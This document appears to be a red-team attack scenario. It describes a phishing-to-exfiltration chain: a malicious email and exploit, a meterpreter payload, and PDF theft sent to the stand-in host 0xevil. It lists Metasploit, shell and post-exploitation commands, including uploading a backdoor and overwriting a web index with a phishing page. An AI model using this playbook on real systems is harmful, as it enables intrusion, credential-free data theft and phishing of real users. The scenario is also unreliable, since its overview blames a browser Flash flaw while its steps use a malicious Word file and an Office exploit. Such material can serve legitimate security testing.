Attack high-level description:
The user logs in to Gmail, open the malicious email, which has a link to the malicious website 0xevil.com:9999, the browser is vulnerable to Flash vulnerability. After the user clicks on the link, a new connection is established to 0xevil.com:8888, that will fetch and inject meterpreter HTTPS payload to firefox process. The user use the gained access to gather information and to drop additional payload to the system (payload.exe). The malicious payload sweeps the system to collect high-profile PDF files, then it opens a HTTPS connection to 0xevil:8080 to exfiltrated the pdf files.

Attack steps and commands:
0- Run the exfiltration server:
python exfiltration-https-server.py

1- Start Metasploit exploit:
- Download exploit from https://github.com/embedi/CVE-2017-11882
use exploit/multi/handler
exploit

2- Send the phishing email to the target.
3- The user download the malicious word file, and the attacker gets a remote shell.

4- Attacker performs the following shell commands using meterpreter shell and Windows console (i.e., cmd.exe):
shell (spawn a shell (i.e., cmd.exe))
> payload.exe (run the payload to exfiltrate pdf files)
> whoami (identify the current user)
> netstat -a (identify listening services)
> ipconfig (enumerate network interfaces)
> cd ../../../../../.. (traverse back to C:\ drive)
> cd Users/admin
> dir
> exit (kill the shell process)
run post/windows/gather/enum_logged_on_users (enumerates logged on users)
run post/windows/gather/enum_shares (enumerates recent shares)
upload payload.exe (upload a backdoor)
upload index.html (overwrite the web index with the phishing webpage)
execute payload.exe

5 - The attacker receive the pdf files using the exfiltration server, which dedicate a folder per host to store the files.
